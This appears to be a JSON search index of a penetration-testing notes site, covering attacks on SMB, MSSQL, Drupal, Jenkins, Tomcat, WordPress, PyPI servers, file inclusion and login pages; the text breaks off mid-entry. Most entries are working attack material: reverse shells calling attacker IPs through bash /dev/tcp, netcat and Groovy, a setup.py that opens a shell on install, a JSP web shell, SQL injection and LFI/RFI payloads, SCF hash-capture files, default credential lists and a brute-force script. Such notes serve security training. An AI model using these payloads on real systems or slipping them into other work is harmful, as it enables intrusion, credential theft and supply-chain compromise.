						"content": "SMB stands for Server Message Block. It’s a protocol for sharing resources like files, printers, in general any resource which should be retreivable or made available by the server. Introduction It primarily runs on port 445 or port 139 depending on the server . It is actually natively available in windows, so windows users don’t need to configure anything extra as such besides basic setting up. In Linux however ,it is a little different. To make it work for Linux, you need to install a samba server because Linux natively does not use SMB protocol. Scanning the network Nmap We can do a port scanner selecting the NetBIOS and SMB ports: nmap -v -p 139,445 -oG smb.nmap &lt;ip-addr&gt; &lt;mask&gt; grep \"Up\" smb.nmap | cut -d \" \" -f 2 Nbtscan We can scan for NetBIOS Service around the network in order to collect additional NetBIOS information like server names: sudo nbtscan -r &lt;ip-addr&gt; &lt;mask&gt; Enumeration a target Nmap scripts Nmap contains many useful NSE scripts that can be used to discover and enumerate SMB services. All these scripts are in the folder usr share nmap scripts ls -l usr share nmap scripts smb* You can launch the script with the --script parameter: nmap -v -p 139,445 --script=&lt;script&gt; &lt;ip-addr&gt; Enum4linux Enum4linux is an script that automatize some tasks: enum4linux -a [-u &lt;user&gt; -p &lt;pass&gt;\"] &lt;ip-addr&gt; Shared Folders There are some available nmap scripts that could help us in that work: nmap -p 139,445 -sV --script smb-\\* &lt;ip-addr&gt; smbmap will shows us available shares and permissions: smbmap -H &lt;ip-addr&gt; #Example Output [+] Guest session IP: ip-addr:445 Name: ip-addr Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers anonymous READ ONLY IPC$ NO ACCESS IPC Service (kenobi server (Samba, Ubuntu)) And we can connect to these shares with smbclient: smbclient &lt;ip-addr&gt; &lt;share&gt; # Guest Session smbclient &lt;ip-addr&gt; &lt;share&gt; -U \"\" -N # Null Session smbclient &lt;ip-addr&gt; &lt;share&gt; -U &lt;user&gt; # Authenticated Session # Older versions smbclient &lt;ip-addr&gt; &lt;share&gt; --option='client min protocol=NT1' To download recursively all the share you can use smbget: smbget -R smb: &lt;ip-addr&gt; &lt;share&gt; smbget -R smb: &lt;ip-addr&gt; &lt;share&gt; -U &lt;user&gt; Also you could enumerate shares with crackmapexec: crackmapexec smb &lt;ip-addr&gt; -u '' -p '' --shares #Null user crackmapexec smb &lt;ip-addr&gt; -u 'username' -p 'password' --shares #Guest user crackmapexec smb &lt;ip-addr&gt; -u 'username' -H '&lt;HASH&gt;' --shares #Guest user Finally you can mount the share on your kali. sudo mount -t cifs -o vers=2.0,username=guest,password=guest &lt;ip-addr&gt; &lt;share&gt; Shell Command Files (SCF) attack It is not new that SCF (Shell Command Files) files can be used to perform a limited set of operations such as showing the Windows desktop or opening a Windows explorer. However a SCF file can be used to access a specific UNC path which allows the penetration tester to build an attack. The code below can be placed inside a text file which then needs to be planted into a network share. [Shell] Command=2 IconFile=\\\\&lt;OUR.IP&gt;\\share\\pentestlab.ico [Taskbar] Command=ToggleDesktop Adding the @ symbol in front of the filename will place the file on the top of the share drive. Filename: @attack.scf When the user will browse the share a connection will established automatically from his system to the UNC path that is contained inside the SCF file. Windows will try to authenticate to that share with the username and the password of the user, so we can capture it with Responder. responder -I eth0 https: pentestlab.blog 2017 12 13 smb-share-scf-file-attacks References: https: medium.com @arnavtripathy98 smb-enumeration-for-penetration-testing-e782a328bf1b https: book.hacktricks.xyz pentesting pentesting-smb#port-139 http: carnal0wnage.attackresearch.com 2007 07 enumerating-user-accounts-on-linux-and.html"
					}

					
				
			
		
			
				
					,
					

					"services-smtp": {
						"id": "services-smtp",
						"title": "PORT 25/tcp - SMTP",
						"category": "",
						"url": " /services/smtp/",
						"content": "The Simple Mail Transfer Protocol (SMTP) is a communication protocol for electronic mail transmission. As an Internet standard. Enumeration User Enumeration SMTP supports several interesting commands, such as VRFY and EXPN. VRFY: Ask the server to verify and email address. EXPN: Ask the server for membership of a mailing list. smtp-user-enum.pl -M VRFY -U users.txt -t 10.0.0.1 smtp-user-enum.pl -M EXPN -u admin1 -t 10.0.0.1 smtp-user-enum.pl -M RCPT -U users.txt -T mail-server-ips.txt smtp-user-enum.pl -M EXPN -D example.com -U users.txt -t 10.0.0.1 Send Mails Telnet Netcat We can conect to our SMTP server via telnet. telnet smtp.server.local 25 nc -nv smtp.server.local 25 Once we’ve got established our connection, we will send a HELO with the name of the host we are trying to connect followed by the message HELO smtp.server MAIL FROM: test@server.local RCPT TO: victim@server.local DATA Subject: Check this out! Body of the message ended with a dot . Swiss Army Knife SMTP (swaks) Other solution to automatize some tasks is using swaks: swaks --to 'victim@server.local' --from 'test@server.local' --server 'smtp.server.local' --header 'Subject: Check this out!' --body 'Body of the message' References: https: book.hacktricks.xyz pentesting pentesting-smtp http: systemadmin.es 2009 01 como-mandar-un-email-con-telnet-protocolo-smtp https: metacpan.org pod distribution Mail-Toaster contrib swaks"
					}

					
				
			
		
			
				
					,
					

					"services-snmp": {
						"id": "services-snmp",
						"title": "PORT 161/udp - SNMP",
						"category": "",
						"url": " /services/snmp/",
						"content": "The Simple Network Management Protocol (SNMP) talks to your network to find out information related to this network device activity: for example, bytes, packets, and errors transmitted and received. Introduction SNMP is not well-understood by many network administrators. This often results in SNMP misconfigurations, which can result in significant information leakage. Scanning the network To scan for open SNMP ports we can use nmap: sudo nmap -sU --open -P 161 &lt;ip-addr&gt; &lt;mask&gt; -oG open-snmp.nmap Bruteforce attack We can use tools such as onesixtyone, which will attempt to brute force attack against a list of IP addresses. First we need to create a file containing community strings: echo public &gt; community.txt echo private &gt;&gt; community.txt echo manager &gt;&gt; community.txt for ip in $(seq 1 254); do echo 10.0.0.$ip; done &gt; ips.txt And run the tool: onesixtyone -c community.txt -i ips.txt Enumeration Entire MIB Tree snmpwalk -c public -v1 -t 10 &lt;ip-addr&gt; Windows Users snmpwalk -c public -v1 -t &lt;ip-addr&gt; 1.3.6.1.4.1.77.1.2.25 Running Windows Processes snmpwalk -c public -v1 &lt;ip-addr&gt; 1.3.6.1.2.1.25.4.2.1.2 Open TCP Ports snmpwalk -c public -v1 &lt;ip-addr&gt; 1.3.6.1.2.1.6.13.1.3 Installed Software snmpwalk -c public -v1 &lt;ip-addr&gt; 1.3.6.1.2.1.25.6.3.1.2"
					}

					
				
			
		
			
				
					,
					

					"services-sql-server": {
						"id": "services-sql-server",
						"title": "PORT 1433/tcp - Microsoft SQL Server",
						"category": "",
						"url": " /services/sql-server/",
						"content": "Introduction Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network. RCE With Credentials sqsh sqsh -S &lt;IP-ADDR&gt; -U &lt;user&gt; -P &lt;pass&gt; -D &lt;database&gt; In MSSQL there is a procedure called xp_cmdshell that receives a command from Windows, executes it and return the result as rows of text. Although the most common case is that the user of the application does not have permissions to execute the xp_cmdshell procedure because is disabled by default, it has been seen on several occasions that, due to a misconfiguration, it does have permissions to enable it. We need to configure xp_cmdshell. 1&gt; EXEC SP_CONFIGURE N'show advanced options', 1 2&gt; go Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install. (return status = 0) 1&gt; EXEC SP_CONFIGURE N'xp_cmdshell', 1 2&gt; go Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install. (return status = 0) 1&gt; RECONFIGURE 2&gt; go Once configured we can execute commands with sqsh or crackmapexec. 1&gt; xp_cmdshell 'dir c:\\'; 2&gt; go crackmapexec We can execute code in a easier way with crackmapexec. crackmapexec mssql -u sa -p password --local-auth -x 'whoami' SQL Injection in MSSQL To understand the vulnerability visit the following page link. SQL Injection Some SQLi payloads are the following (supposing that the original query return two values): ' union all select 1,2 -- - # Current User ' union all select CURRENT_USER, 2 -- - # Databases ' union all select name, 2 from master..sysdatabases -- - # Tables from database \"music\" ' union all select name, 2 from music..sysobjects WHERE xtype = 'U' -- - # Columns from \"users\" table ' union all select name, 2 from syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users') -- - # Dump a table ' union all select user, password from users -- - We can also append commands on the query and execute commands with the procedure xp_cmdshell. '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; -- - '; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- - '; EXEC xp_cmdshell '\\\\10.10.10.10\\share\\nc.exe -e cmd.exe 10.10.10.10 443' -- - LFI or File Download to RCE If we are able to download any file of the system and has the MSSQL port open, we can retrieved the sa hash. We need to download a copy of the master.mdf file located on: C: Program Files Microsoft SQL Server MSSQL14.SQLEXPRESS MSSQL DATA master.mdf or C: Program Files Microsoft SQL Server MSSQL14.SQLSERVER MSSQL DATA master.mdf Since the file is running we can not read it, so we need to find a backup. Some backups are available here: C: Program Files Microsoft SQL Server MSSQL14.SQLEXPRESS MSSQL Backup master.mdf Once downloaded we can dump the hashes with XPN script. https: github.com xpn Powershell-PostExploitation tree master Invoke-MDFHashes Note: The code fails while trying to load OrcaMDF dlls, see the following pull request to fix it. https: github.com xpn Powershell-PostExploitation pull 2 File changed: We just need to import the module and extract the hashes. Import-Module Get-MDFHashes.psq Get-MDFHashes -mdf master.mdf We can crack it with Hashcat (mode 1731). hashcat -a 0 -m 1731 hash.txt usr share wordlists rockyou.txt Once obtained the credentials we can execute code with crackmapexec or sqsh. https: blog.xpnsec.com extracting-master-mdf-hashes References https: www.tarlogic.com blog red-team-tales-0x01 #:~:text=In%20MSSQL%2C%20there%20is%20a,occurs%20in%20the%20original%20query. https: dotcppfile.wordpress.com 2014 07 24 reading-files-in-mssql-injection-tutorial https: github.com swisskyrepo PayloadsAllTheThings blob master SQL%20Injection MSSQL%20Injection.md https: blog.xpnsec.com extracting-master-mdf-hashes"
					}

					
				
			
		
			
				
					,
					

					"software-drupal": {
						"id": "software-drupal",
						"title": "Drupal",
						"category": "",
						"url": " /software/drupal/",
						"content": "Drupalgeddon (&lt;7.58, &lt;8.5.1, &lt;8.46, &lt;8.3.9) - CVE-2018-7600 All version of drupal lower than 7.58 are vulnerable to RCE. ruby drupalgeddon2.rb http: &lt;ip&gt; https: github.com dreadlocked Drupalgeddon2 From Admin to Reverse Shell Firstly we need to enable PHP filter on Modules tab. And go to Content -&gt; +Add Content -&gt; Article, select PHP code as Text Format and finally introduce the reverse shell on the body. &lt;?php exec(\" bin bash -c 'bash -i &gt;&amp; dev tcp 10.10.14.20 4444&gt;&amp;1'\"); ?&gt; Finally clicking Preview button a reverse shell is spawned to our listener. Config files Database Connection $DRUPAL sites default settings.php"
					}

					
				
			
		
			
				
					,
					

					"software-jenkins": {
						"id": "software-jenkins",
						"title": "Jenkins",
						"category": "",
						"url": " /software/jenkins/",
						"content": "Introduction Jenkins is a free and open source automation server. It helps automate the parts of software development related to building, testing, and deploying, facilitating continuous integration and continuous delivery. It is a server-based system that runs in servlet containers such as Apache Tomcat. Enumeration We can obtain a some valuable information without necessarily log in on the server. Jenkins Version Visit the following route to obtain the Jenkins version on the footer page. oops error Page generated: Sep 27, 2021 12:46:28 PM PDTREST APIJenkins ver. 2.204.1 Users Without credentials it is possible to obtain some users. people people asynchPeople asynchPeople securityRealm user admin search index?q= Credentials There are no default credentials but some times these works. Note: Jenkins does not have any type of account lockout neither a strong password policy so you can try to brute force it. admin:admin admin:nimda admin:password admin:jenkins manager:manager manager:reganam manager:password manager:jenkins In new versions the password is randomized at installation. We can find the initial password here: Linux var jenkins_home secrets initialAdminPassword home jenkins secrets initialAdminPassword var lib jenkins secrets initialAdminPassword opt jenkins secrets initialAdminPassword Windows C:\\Program Files (x86)\\Jenkins\\secrets\\initialAdminPassword C:\\Program Files\\Jenkins\\secrets\\initialAdminPassword From Admin to Reverse Shell There are multiple ways in which from administrative privileges in Jenkins you can get a reverse shell. Script Console To obtain a Reverse shell we need to execute Manage Jenkins on Script Console. http: &lt;jenkins_server&gt; script This is and example of Grovy Script to execute commands on the target machine, either windows or linux. def sout = new StringBuffer(), serr = new StringBuffer() def proc = 'whoami'.execute() proc.consumeProcessOutput(sout, serr) proc.waitForOrKill(1000) println \"out&gt; $sout err&gt; $serr\" Windows Reverse Shell String host=\"&lt;IP-ADDR&gt;\"; int port=&lt;PORT&gt;; String cmd=\"cmd.exe\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); Linux Reverse Shell First we need to craft the payload. $ echo \"bash -c 'bash -i &gt;&amp; dev tcp 10.10.10.10 443 0&gt;&amp;1'\" | base64 YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDMgMD4mMScK And introduce inside the Grovvy script. def sout = new StringBuffer(), serr = new StringBuffer() def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDMgMD4mMScK}|{base64,-d}|{bash,-i}'.execute() proc.consumeProcessOutput(sout, serr) proc.waitForOrKill(1000) println \"out&gt; $sout err&gt; $serr\" Freestyle Project We can create a new project or see if we can modify the configuration of an existant project. To create a new project go on New Item tab. Introduce a name such as Access and select Freestyle Project . Scroll down until you find the Build section and add a Execute Windows batch command as build step. Introduce the reverse shell on the Command window and click Save. \\\\10.10.10.10\\share\\nc.exe -e cmd.exe 10.10.10.10 powershell.exe -c &lt;command&gt; Go to Build Now section. When the build is executed a new item will be displayed under the Build History. At that moment a reverse shell is obtained. $ sudo nc -lvp 443 listening on [any] 443 ... connect to [10.10.10.11] from (UNKNOWN) [10.10.10.11] 26524 Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt; We can also check the console output selecting the Built Item #1 and going to Console Output section."
					}

					
				
			
		
			
				
					,
					

					"software-pypi-server": {
						"id": "software-pypi-server",
						"title": "PyPI Server",
						"category": "",
						"url": " /software/pypi-server/",
						"content": "PyPI Server (pypiserver) is a minimal PyPi compatible server for pip or easy_install. What is a PyPI Server? pypiserver is a minimal PyPI compatible server for pip or easy_install. It is based on bottle and serves packages from regular directories. Wheels, bdists, eggs and accompanying PGP-signatures can be uploaded either with pip, setuptools, twine, pypi-uploader, or simply copied with scp. PyPI Server helps us to create a Pirvate Python Package Repository. What happens when someone installs from that server and we have the password? On that moment that we notice that someone installs all packages from the pypiserver, and we have the password, we can upload our malicious python package. We will usually find the password inside the .htpasswd file from apache or nginx. Create our Python Package Firstly, we need to create a directory with the name of the package, in this example I will use demo_hacking. Navigate into the newly created directory. And create the following files following the hierarchy: demo_hacking ├── demo_hacking │ └── __init__.py ├── README.md ├── setup.cfg ├── setup.py └── .pypirc Edit setup.py file, in this file we will put our malicious code. At the moment of the installation package our code will execute on victim’s machine. This is an example of reverse shell from setuptools import setup import os os.system(\"nc -e bin bash ip-addr port\") #this is the malicious code setup( name='demo_hacking', packages=['demo_hacking'], description='Demo H4ck1ng edition', version='0.1', author='mvc1009', keywords=['pip','demo','hacking'] ) Add an example function to __init__.py: def print_demo(): print(\"Demo Hacking\") The setup.cfg file lets PyPI know the README is a Markdown file: [metadata] description-file = README.md Create an empty README.md optionally you can create a LICENSE.txt file: touch REAMDE.md touch LICENSE.txt Finally you need to create the .pypirc file on the home directory: [distutils] index-servers = pypi demo [pypi] username: password: [demo] repository: http: localhost:port username: user password: password Hint: Do not forget that you can change the dome directory path: export HOME=path Finally you need to upload de package to the pypiserver. python setup.py sdist upload -r demo References: https: pypi.org project pypiserver https: www.linode.com docs guides how-to-create-a-private-python-package-repository"
					}

					
				
			
		
			
				
					,
					

					"software-tomcat": {
						"id": "software-tomcat",
						"title": "Tomcat",
						"category": "",
						"url": " /software/tomcat/",
						"content": "Tomcat is a web service commonly open in port 8080 tcp. Introduction Apache Tomcat is a free and open-source implementation of the Java Servlet, JavaServer Pages, Java Expression Language and WebSocket technologies. Tomcat provides a “pure Java” HTTP web server environment in which Java code can run. Apache Tomcat &lt; 9.0.1 (Beta) &lt; 8.5.23 &lt; 8.0.47 &lt; 7.0.8 - JSP Upload Bypass Exists a exploit to execute remote command by uploading a .war file without prior authentication. https: www.exploit-db.com exploits 42966 Installation Directory Depending the version installed or if its installed manually or using apt, it would be located in different places. opt tomcat opt tomcat7 opt tomcat9 usr share tomcat usr share tomcat7 usr share tomcat9 Configuration Files There are serveral important files to look into and take info about the server. server.xml The server.xml file is Tomcat’s main configuration file, and is responsible for specifying Tomcat’s initial configuration on startup as well as defining the way and order in which Tomcat boots and builds. The elements of the server.xml file belong to five basic categories - Top Level Elements, Connectors, Containers, Nested Components, and Global Settings. TOMCAT-HOME conf web.xml web.xml The web.xml file is derived from the Servlet specification, and contains information used to deploy and configure the components of your web applications. TOMCAT-HOME conf web.xml tomcat-users.xml This last file contains the credentials and privileges of the tomcat users. TOMCAT-HOME etc tomcat-users.xml Default credentials SecLists have a list of default credentials in Tomcat: admin: admin:admanager admin:admin admin:admin ADMIN:ADMIN admin:adrole1 admin:adroot admin:ads3cret admin:adtomcat admin:advagrant admin:password admin:password1 admin:Password1 admin:tomcat admin:vagrant both:admanager both:admin both:adrole1 both:adroot both:ads3cret both:adtomcat both:advagrant both:tomcat cxsdk:kdsxc j2deployer:j2deployer manager:admanager manager:admin manager:adrole1 manager:adroot manager:ads3cret manager:adtomcat manager:advagrant manager:manager ovwebusr:OvW*busr1 QCC:QLogic66 role1:admanager role1:admin role1:adrole1 role1:adroot role1:ads3cret role1:adtomcat role1:advagrant role1:role1 role1:tomcat role:changethis root:admanager root:admin root:adrole1 root:adroot root:ads3cret root:adtomcat root:advagrant root:changethis root:owaspbwa root:password root:password1 root:Password1 root:r00t root:root root:toor tomcat: tomcat:admanager tomcat:admin tomcat:admin tomcat:adrole1 tomcat:adroot tomcat:ads3cret tomcat:adtomcat tomcat:advagrant tomcat:changethis tomcat:password tomcat:password1 tomcat:s3cret tomcat:s3cret tomcat:tomcat xampp:xampp server_admin:owaspbwa admin:owaspbwa demo:demo From Admin to Reverse Shell If you have access to the Tomcat Web Application Manager, you are able to upload and deploy a malicious .war file. Finding the endpoint First is important to find the endpoint. manager text list manager list curl -u tomcat:'password' http: localhost:8080 manager text list OK - Listed applications for virtual host [localhost] :running:0:ROOT examples:running:0: usr share tomcat9-examples examples host-manager:running:1: usr share tomcat9-admin host-manager manager:running:0: usr share tomcat9-admin manager Creating a shell (.WAR) There are serveral ways to create the war. MSFVenom Reverse Shell msfvenom -p java jsp_shell_reverse_tcp LHOST=&lt;ip-addr&gt; LPORT=&lt;port&gt; -f war -o revshell.war Manual Web Shell Create a index.jsp with the following content: &lt;FORM METHOD=GET ACTION='index.jsp'&gt; &lt;INPUT name='cmd' type=text&gt; &lt;INPUT type=submit value='Run'&gt; &lt; FORM&gt; &lt;%@ page import=\"java.io.*\" %&gt; &lt;% String cmd = request.getParameter(\"cmd\"); String output = \"\"; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd,null,null); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s+\"&lt; br&gt;\"; } } catch(IOException e) { e.printStackTrace(); } } %&gt; &lt;pre&gt;&lt;%=output %&gt;&lt; pre&gt; And run the following commands: mkdir webshell cp index.jsp webshell cd webshell jar -cvf .. webshell.war * webshell.war is created Uploading the shell We just need to upload it and visit the path. curl --upload-file webshell.war -u tomcat:'$3cureP4s5w0rd123!' http: localhost:8001 manager text deploy?path= shell OK - Deployed application at context path [ shell] Finally we can visit the path: http: locahost:8080 shell References https: book.hacktricks.xyz pentesting pentesting-web tomcat#post https: www.youtube.com watch?v=yTHtLi9YZ2s"
					}

					
				
			
		
			
				
					,
					

					"software-wordpress": {
						"id": "software-wordpress",
						"title": "WordPress",
						"category": "",
						"url": " /software/wordpress/",
						"content": "Wordpress is maybe the most common CMS on internet. WPScan wpscan --url http: example.com -e ap,at,cb,dbe,u1-5,m1-15 --api-token &lt;APITOKEN&gt; From Admin to RCE Theme Editor We can modify a theme by adding a reverse shell or a webshell on the 404.php file. Installing Plugin Another way to obtain a reverse shell is to upload and install a plugin. It is important to add the comment lines in order to a successful installation. &lt;?php * Plugin Name: HackinNotes Wordpress Shell Plugin URI: https: github.com leonjza wordpress-shell Description: Execute Commands as the webserver you are serving wordpress with! Shell will probably live at wp-content plugins shell shell.php. Commands can be given using the 'cmd' GET parameter. Eg: \"http: 192.168.0.1 wp-content plugins shell shell.php?cmd=id\", should provide you with output such as &lt;code&gt;uid=33(www-data) gid=verd33(www-data) groups=33(www-data)&lt; code&gt; Author: Leon Jacobs Version: 0.3 Author URI: https: leonjza.github.io * system(\"rm tmp f;mkfifo tmp f;cat tmp f| bin sh -i 2&gt;&amp;1|nc 10.10.10.10 443 &gt; tmp f\");?&gt; After that we just need to zip it and install. zip revshell-plugin.zip revshell-plugin.php"
					}

					
				
			
		
			
				
					,
					

					"web-file-inclusion": {
						"id": "web-file-inclusion",
						"title": "File Inclusion",
						"category": "",
						"url": " /web/file-inclusion/",
						"content": "File Inclusion refers to an inclusion attack through which an attacker can trick the web application into including files on the web server. Introduction Path Travesal can lead to two different types of File Inclusion: Local File Inclusion (LFI): When is possible to include a local file. Remote File Inclusion (RFI): When is possible to include remote files. Path Traversal Directory traversal (also known as file path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application. A search for path traversals begins with the examination of URL query strings and form bodies in search of values that appears as file references, including the most common indicator as file extensions. &lt;img src=\" loadImage?filename=218.png\"&gt; The loadImage URL takes a filename parameter and returns the contents of the specified file. The image files themselves are stored on disk in the location var www images . var www images 218.png So we can request the following url to retrieve an arbitrary file from the server’s filesystem: https: insecure-website.com loadImage?filename=.. .. .. etc passwd This causes the application to read from the following file path var www images .. .. .. etc passwd Interesting Files There are some interesting files to read, such as information about the server (users, groups), logs, etc… Linux etc passwd etc shadow etc issue etc group etc hostname etc ssh ssh_config etc ssh sshd_config root .ssh id_rsa root .ssh authorized_keys home user .ssh authorized_keys home user .ssh id_rsa proc [0-9]* fd [0-9]* proc mounts home $USER .bash_history home $USER .ssh id_rsa var run secrets kubernetes.io serviceaccount var lib mlocate mlocate.db var lib mlocate.db Apache etc apache2 apache2.conf usr local etc apache2 httpd.conf etc httpd conf httpd.conf Red Hat CentOS Fedora Linux -&gt; var log httpd access_log Debian Ubuntu -&gt; var log apache2 access.log FreeBSD -&gt; var log httpd-access.log var log apache access.log var log apache error.log var log apache2 access.log var log apache error.log MySQL var lib mysql mysql user.frm var lib mysql mysql user.MYD var lib mysql mysql user.MYI Windows boot.ini autoexec.bat windows system32 drivers etc hosts windows repair SAM windows panther unattended.xml windows panther unattend unattended.xml windows system32 license.rtf windows system32 eula.txt Local File Inclusion (LFI) Its similar to Path Traversal but not exactly the same, the difference is, in file inclusion if we include a PHP it will be interpreted and executed while in path traversal not. PHP Wrappers PHP provides several protocols wrappers that we can use to exploit path traversal and local file inclusion vulnerabilities. These filters give us additional flexibility when attempting to inject PHP code via LFI vulnerabilities. Wrapper data: Used to embed inline data as part of the URL with plaintext or base64. include.php?file=data:text plain,&lt;?php system($_GET[\"cmd\"]);?&gt;&amp;cmd=id include.php?file=data:,&lt;?php system($_GET[\"cmd\"]);?&gt;&amp;cmd=id include.php?file=data:;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=&amp;cmd=id Wrapper filter: Used to encode convert files. Usefull to read php files. The part of php: filter is case insensitive. include.php?file=php: filter read=string.rot13 resource=file.php include.php?file=php: filter conver.base64-encode resource=file.php include.php?file=pHp: Filter conver.base64-encode resource=file.php include.php?file=php: filter zlib.deflate convert.base64-encode resource=file.php To read the compression data you need to decode the base64 and read the resulting data using: php -a readfile('php: filter zlib.inflate resource=test.deflated'); Wrapper zip: Upload a Zip file with a PHPShell inside and access it. echo \"&lt;pre&gt;&lt;?php system($_GET['cmd']); ?&gt;&lt; pre&gt;\" &gt; payload.php; zip payload.zip payload.php; mv payload.zip shell.jpg; rm payload.php http: example.com index.php?page=zip: shell.jpg%23payload.php Wrapper expect: Used to execute code. include.php?file=except: id Wrapper input: Interpret php payload sent by POST parameters. include.php?file=php: input POST DATA: &lt;?php system($_GET[\"cmd\"]);?&gt; Remote File Inclusion (RFI) When we are able to include remote files to the application is synonym of remote code execution. We can include a webshell or a reverse shell. usr share webshells php php-reverse-shell.php Or you can create a php file with command execution or another type of reverse shell: &lt;?php $output = shell_exec('whoami 2&gt;&amp;1'); echo \"$output\"; ?&gt; Finally you only need to set up a HTTP server or SMB server and request the rev shell. include.php?file=http: ip-addr:port php-reverse-shell.php include.php?file=\\\\ip-addr\\smbserver\\php-reverse-shell.php Some times impacket-smbserver doesn’t works due to the outdated SMB version of the target machine and we need to configure it manually. ❯ cat etc samba smb.conf [global] server role = standalone server map to guest = Bad User usershare allow guest = yes host allow = &lt;ip-target-machine&gt; [badsmb] path = &lt;directory&gt; browseable = yes read only = no guest ok = yes Looking to RCE There are several ways to escalate a LFI to a RCE. Via Log Poisoning We can poison the logs with the user agent. GET HTTP 1.O Host: example.com User-Agent: &lt;?php system($_GET[\"cmd\"]);?&gt; And try to access to var log apache2 access.log. include.php?file=.. .. .. .. var log apache2 access.log&amp;cmd=id Via Email If SMTP is open in the server we can easily send a mail to an internal account. “user@localhost” containing the following payload &lt;?php system($_GET[\"cmd\"]);?&gt; And access to the mail inbox of the user. include.php?file=.. .. .. .. var mail user&amp;cmd=id Via Environ Like a log file, sending the payload in the User-Agent, it will be reflected inside the proc self environ file. GET include.php?file=.. .. .. .. proc self environ&amp;cmd=id HTTP 1.O Host: example.com User-Agent: &lt;?php system($_GET[\"cmd\"]);?&gt; Via Upload If exists a functionality that leads us to upload an arbitrary file, we can upload directly a reverse shell or simply upload a image with the payload injected on metadata. To modify metadata of a file we can use exiftool. exiftool -DocumentName='&lt;?php system($_GET[\"cmd\"]);?&gt;' myimage.jpg Once uploaded we can access it. include.php?file=.. .. uploads myimage.jpg&amp;cmd=id References https: portswigger.net web-security file-path-traversal https: book.hacktricks.xyz pentesting-web file-inclusion"
					}

					
				
			
		
			
				
					,
					

					"web-login-panes": {
						"id": "web-login-panes",
						"title": "Login Panes",
						"category": "",
						"url": " /web/login-panes/",
						"content": "We can find some login panes that we want to bypass or bruteforce. Here you can find some amazing tricks. Bruteforce it! Hydra hydra is a powerful network service attack tool that attacks a variety of protocol authentication schemes, including SSH and HTTP. POST Forms hydra &lt;ip-addr&gt; -l user -P passwords.txt -s &lt;port&gt; -vV -f http-form-post \" index.php:user=^USER^&amp;password=^PASS^:Invalid Credentials\" -l user -L user wordlist -p password -P password wordlist Basic Auth hydra &lt;ip-addr&gt; -l user -P passwords.txt -s &lt;port&gt; -vV -f http-get index.php My own script I made my own script in order to bruteforce some login panes with CSRF protection. I think is a good alternative to the Burpsuite Pitchfork attack. #! usr bin env python3 import sys, os, requests, codecs s = requests.Session() # Get CRSF TOKEN resp = s.get(\"https: WEBPAGE.LOCAL \", verify=False) regex = '&lt;input type=\"hidden\" name=\"csrf\" value=\"(.*)\"' token = re.search(regex,resp.text).group(1) with codecs.open(\" usr share wordlists rockyou.txt\", 'r', encoding='utf-8', errors='ignore') as wordlist: dic = wordlist.read().splitlines() for pwd in dic: #Bruteforce data_post = { \"csrf\" : token, \"username\" : \"admin\", \"password\" : pwd, } print(\"[!] Trying: \" + pwd) resp2 = s.post(\"https: WEBPAGE.LOCAL login\", json=data_post, verify=False) if \"permission_denied\" not in resp2.text: print(\"Username = \" + username + \"Password = \" + pwd) sys.exit(0) Bypass it! The are very different methods to bypass a login pane, this are the most common ones. SQLi There are more info to bypass login panes with SQL Injections in: sqli.md PHP Type Juggling (==) How PHP’s type comparison features lead to vulnerabilities and in that case to bypass the login. Loose comparisons (==) have a set of operand conversion rules to make it easier for developers. Let’s check the differences between Strict comparisons (===) and Loose comparisons (==). When we find some code like this: if($_POST['password'] == \"secretpass\") Instead of send a string we send an array we will bypass the login: username=admin&amp;password[]= https: owasp.org www-pdf-archive PHPMagicTricks-TypeJuggling.pdf Magic Hashes This particular implication for password hashes wen the operator equals-equals(==) is used. The problem is in == comparison, the 0e means that if the following characters are all digits the whole string gets treated as a float. Below is a list of hash types that when hashed are ^0+ed*$ which equates to zero in PHP when magic hashes typing using the “==” operator is applied. That means that when a password hash starts with “0e…” as an example it will always appear to match the below strings, regardless of what they actually are if all of the subsequent characters are digits from “0-9”. # MD5 240610708 - 0e462097431906509019562988736854 QNKCDZO - 0e830400451993494058024219903391 aabg7XSs - 0e087386482136013740957780965295 https: www.whitehatsec.com blog magic-hashes Client Certificates SSL TLS certificates are commonly used for both encryption and identification of the parties, sometimes this is used instead of credentials at login. Setting up the private key and the certificate (Server) First of all, we need to generate our keys and certificates. We use the openssl command-line tool. openssl req -x509 -newkey rsa:4096 -keyout server_key.pem -out server_cert.pem -nodes -days 365 -subj \" CN=localhost O=Client\\ Certificate\\ Demo\" Setting up client certificates To create a key and a Certificate Signing Request for Alice and Bob we can use the following command: openssl req -newkey rsa:4096 -keyout alice_key.pem -out alice_csr.pem -nodes -days 365 -subj \" CN=Alice\" openssl req -newkey rsa:4096 -keyout bob_key.pem -out bob_csr.pem -nodes -days 365 -subj \" CN=Bob\" Server Signed Certificate: openssl x509 -req -in alice_csr.pem -CA server_cert.pem -CAkey server_key.pem -out alice_cert.pem -set_serial 01 -days 365 Maybe during the pentest we found the server key, remember that we can download the server certificate with the browser. Self-Signed Certificate: openssl x509 -req -in bob_csr.pem -signkey bob_key.pem -out bob_cert.pem -days 365 Trying to get in To use these certificates in our browser or via 